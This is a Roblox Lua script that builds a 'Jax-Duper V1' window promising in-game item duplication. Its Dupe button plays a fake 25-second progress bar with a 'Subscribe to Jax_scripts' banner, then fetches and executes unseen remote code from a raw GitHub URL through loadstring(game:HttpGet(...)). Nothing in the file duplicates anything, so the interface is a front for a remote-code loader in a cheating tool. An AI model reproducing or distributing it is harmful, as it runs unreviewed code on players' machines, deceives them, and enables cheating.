local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "JaxDuperGui"
gui.Parent = player:WaitForChild("PlayerGui")

-- 🟫 Główne okno
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 160)
frame.Position = UDim2.new(0.5, -150, 0.5, -80)
frame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = frame

-- 🔳 Pasek u góry
local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 25)
topBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
topBar.BorderSizePixel = 0
topBar.Parent = frame

local topCorner = Instance.new("UICorner")
topCorner.CornerRadius = UDim.new(0, 15)
topCorner.Parent = topBar

local mask = Instance.new("Frame")
mask.Size = UDim2.new(1, 0, 0, 10)
mask.Position = UDim2.new(0, 0, 1, -10)
mask.BackgroundColor3 = topBar.BackgroundColor3
mask.BorderSizePixel = 0
mask.Parent = topBar

-- 🧩 Tytuł
local title = Instance.new("TextLabel")
title.Size = UDim2.new(0, 200, 1, 0)
title.Position = UDim2.new(0, 8, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Jax-Duper V1"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 16
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = topBar

-- ❌ Przycisk zamknięcia
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 25, 0, 25)
closeButton.Position = UDim2.new(1, -30, 0, 0)
closeButton.BackgroundTransparency = 1
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 80, 80)
closeButton.Font = Enum.Font.SourceSansBold
closeButton.TextSize = 18
closeButton.Parent = topBar

-- ➖ Przycisk minimalizacji
local minimizeButton = Instance.new("TextButton")
minimizeButton.Size = UDim2.new(0, 25, 0, 25)
minimizeButton.Position = UDim2.new(1, -60, 0, 0)
minimizeButton.BackgroundTransparency = 1
minimizeButton.Text = "-"
minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
minimizeButton.Font = Enum.Font.SourceSansBold
minimizeButton.TextSize = 18
minimizeButton.Parent = topBar

-- 🟩 Przycisk Dupe
local dupeButton = Instance.new("TextButton")
dupeButton.Size = UDim2.new(0, 120, 0, 45)
dupeButton.Position = UDim2.new(0.5, -60, 0.5, -20)
dupeButton.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
dupeButton.Text = "Dupe"
dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
dupeButton.Font = Enum.Font.SourceSansBold
dupeButton.TextSize = 22
dupeButton.BorderSizePixel = 0
dupeButton.Parent = frame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(1, 0)
btnCorner.Parent = dupeButton

-- 🕓 Ekran ładowania
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = frame.Size
loadingFrame.Position = frame.Position
loadingFrame.BackgroundColor3 = frame.BackgroundColor3
loadingFrame.Visible = false
loadingFrame.Parent = gui

local loadingCorner = Instance.new("UICorner")
loadingCorner.CornerRadius = UDim.new(0, 15)
loadingCorner.Parent = loadingFrame

-- Pasek tytułowy też w loading
local loadingTop = topBar:Clone()
loadingTop.Parent = loadingFrame

-- Tekst "Subscribe..."
local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1, 0, 0, 30)
infoLabel.Position = UDim2.new(0, 0, 0.3, 0)
infoLabel.BackgroundTransparency = 1
infoLabel.Text = "Subscribe to Jax_scripts"
infoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
infoLabel.Font = Enum.Font.SourceSansBold
infoLabel.TextSize = 18
infoLabel.Parent = loadingFrame

-- Pasek postępu
local progressBarBG = Instance.new("Frame")
progressBarBG.Size = UDim2.new(0.8, 0, 0, 15)
progressBarBG.Position = UDim2.new(0.1, 0, 0.6, 0)
progressBarBG.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
progressBarBG.BorderSizePixel = 0
progressBarBG.Parent = loadingFrame

local progressBarCorner = Instance.new("UICorner")
progressBarCorner.CornerRadius = UDim.new(1, 0)
progressBarCorner.Parent = progressBarBG

local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
progressFill.BorderSizePixel = 0
progressFill.Parent = progressBarBG

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(1, 0)
fillCorner.Parent = progressFill

-- Tekst "Duping..."
local dupingLabel = Instance.new("TextLabel")
dupingLabel.Size = UDim2.new(1, 0, 0, 30)
dupingLabel.Position = UDim2.new(0, 0, 0.8, 0)
dupingLabel.BackgroundTransparency = 1
dupingLabel.Text = "Duping..."
dupingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
dupingLabel.Font = Enum.Font.SourceSansBold
dupingLabel.TextSize = 18
dupingLabel.Parent = loadingFrame

-- 🧠 Logika
local minimized = false

minimizeButton.MouseButton1Click:Connect(function()
	minimized = not minimized
	frame.Visible = not minimized
end)

closeButton.MouseButton1Click:Connect(function()
	gui:Destroy()
end)

dupeButton.MouseButton1Click:Connect(function()
	frame.Visible = false
	loadingFrame.Visible = true

	for i = 0, 100 do
		progressFill.Size = UDim2.new(i/100 * 0.8, 0, 1, 0)
		task.wait(0.25) -- 100 * 0.25 = 25s
	end

	-- 🔥 Uruchomienie skryptu
	loadstring(game:HttpGet("https://raw.githubusercontent.com/DevTrax9/Main/refs/heads/main/DupeMain.lua"))()

	task.wait(1)
	loadingFrame.Visible = false
	frame.Visible = true
end)
